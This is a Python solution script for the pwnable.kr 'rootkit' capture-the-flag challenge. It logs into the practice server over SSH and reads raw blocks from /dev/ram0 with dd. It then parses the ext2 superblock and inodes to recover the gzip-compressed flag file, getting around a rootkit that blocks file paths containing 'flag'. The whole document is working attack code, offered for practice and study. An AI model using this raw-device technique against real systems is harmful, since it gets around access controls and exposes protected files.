#!/usr/bin/env python3
import gzip
import re
import struct
import time

import paramiko


HOST = "pwnable.kr"
PORT = 2222
USER = "rootkit"
PASSWORD = "guest"
BLOCK_SIZE = 1024
FLAG_INODE = 13


def read_console(command: str, timeout: int = 10) -> str:
    client = paramiko.SSHClient()
    client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
    client.connect(
        HOST,
        port=PORT,
        username=USER,
        password=PASSWORD,
        timeout=10,
        banner_timeout=10,
        auth_timeout=10,
    )
    chan = client.invoke_shell(width=240, height=80)
    chan.settimeout(0.0)

    boot = b""
    start = time.time()
    while time.time() - start < 15:
        if chan.recv_ready():
            boot += chan.recv(8192)
            if b"/ #" in boot[-200:]:
                break
        time.sleep(0.05)

    chan.send(command + "\n")
    out = b""
    start = time.time()
    while time.time() - start < timeout:
        if chan.recv_ready():
            out += chan.recv(8192)
            if b"DONE" in out and out.rstrip().endswith(b"/ #"):
                break
        time.sleep(0.05)

    chan.close()
    client.close()
    text = out.decode("utf-8", "replace")
    return re.sub(r"\x1b\[[0-9;?]*[A-Za-z]", "", text).replace("\r", "")


def read_ram(offset: int, count: int) -> bytes:
    # Use /dev/ram0, not /flag. The rootkit only blocks pathname args containing
    # "flag" on open/link/symlink/rename syscalls.
    cmd = (
        "echo B64START\n"
        f"dd if=/dev/ram0 bs=1 skip={offset} count={count} 2>/dev/null | base64\n"
        "echo B64END\n"
        "echo DONE"
    )
    text = read_console(cmd)
    lines = text.splitlines()
    collect = False
    parts = []
    for line in lines:
        line = line.strip()
        if line == "B64START":
            collect = True
            continue
        if line == "B64END":
            collect = False
            continue
        if collect and re.fullmatch(r"[A-Za-z0-9+/=]{4,}", line):
            parts.append(line)
    import base64

    return base64.b64decode("".join(parts))


def main() -> None:
    superblock = read_ram(1024, 128)
    inode_size = struct.unpack_from("<H", superblock, 0x58)[0] or 128

    group_desc = read_ram(2048, 32)
    inode_table_block = struct.unpack_from("<I", group_desc, 8)[0]

    inode_offset = inode_table_block * BLOCK_SIZE + (FLAG_INODE - 1) * inode_size
    inode = read_ram(inode_offset, inode_size)
    size = struct.unpack_from("<I", inode, 4)[0]
    first_block = struct.unpack_from("<I", inode, 40)[0]

    compressed = read_ram(first_block * BLOCK_SIZE, size)
    print(gzip.decompress(compressed).decode().strip())


if __name__ == "__main__":
    main()
